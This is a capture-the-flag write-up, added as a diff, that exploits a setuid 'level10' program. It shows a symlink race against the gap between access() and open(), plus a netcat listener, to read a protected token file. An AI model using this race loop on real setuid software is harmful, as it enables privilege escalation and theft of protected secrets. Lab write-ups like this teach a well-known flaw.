@@ -1,0 +1,102 @@
+ll
+|
+L-> -rwsr-sr-x+ 1 flag10  [...]  level10*
+L-> -rw-------  1 flag10  [...]  token
+
+we see that we have a level10 prog who is launched as flag10 and a token file but we can't read into it 
+let's try the prog
+
+./level10
+|
+L->   sends file to host if you have access to it
+
+send to host ? let's see where is from that text
+
+strings level10
+|
+L-> %s file host
+L->         sends file to host if you have access to it
+L-> Connecting to %s:6969 ..
+L-> Unable to connect to host %s
+L-> .*( )*.
+L-> Unable to write banner to host %s
+L-> Connected!
+L-> Sending file ..
+L-> Damn. Unable to open file
+L-> Unable to read from file: %s
+L-> wrote file!
+L-> You don't have access to %s
+
+got some interresting informations, like the port where the program try to send file
+so we need to listen on this port from another machine whith nc 6969 -l for example
+
+so now that we listening let's try to send the token file
+
+./level10 token ip
+|
+L-> You don't have access to token
+
+ok so the program know that we don't have access to this file 
+
+echo "hi you" > /tmp/token
+
+./level10 /tmp/token ip
+
+oh we receive something on the other machine:
+L-> .*( )*.
+L-> hi you
+
+ok so we receive the content of the file let's try with a symbolic link 
+
+ln -s token /tmp/sym
+
+./level10 /tmp/sym ip
+|
+L-> You don't have access to /tmp/sym
+
+ok so the permission is checked also on it let's find what's checking that
+
+strings level10
+|
+L-> open
+L-> access
+
+let's see what access is for with the man
+
+man access
+|
+L->  access()  checks whether the calling process can access the file pathname.  If pathname is a symbolic link, it is dereferenced.
+L-> [...]
+L-> Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so
+       using open(2) creates a security hole, because the user might exploit the short time interval between checking
+       and  opening  the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In
+       the example just described, a safer alternative would be to temporarily switch the process's effective user ID
+       to the real ID and then call open(2).)
+
+ok so we see that we can bruteforce this, if access return 0 by check if we can have access to this file
+we can change the file content before the opening of it to get what's inside
+
+so in theory we just have to create a symlink on a file which is accessible and then directly link it to the token file
+in the process of access -> open but this need to be fast like that we have
+
+link_file linked to random_file // wich is accessible
+access(link_file) // return 0 so we can access it
+link_file linked to token // which is not accessible
+open(link_file) // return the content of token file
+
+so let's create an accessible file in our home
+chmod 777 .
+touch random_file
+
+we need to bruteforce this and wait for the perfect timing so we will use 2 while in shell with a & like that
+the 2 while will run together
+first while will need to always change the link (ln -fs f for overrind the dest and s for symlink)
+second while will need to launch the program
+so:
+
+(while true; do ln -fs random_file flag; ln -fs token flag; done)& while true; do ./level10 flag ip; done
+
+after a lot of error we receive the content !
+
+let's connect to flag10 with the token and get the flag !
+
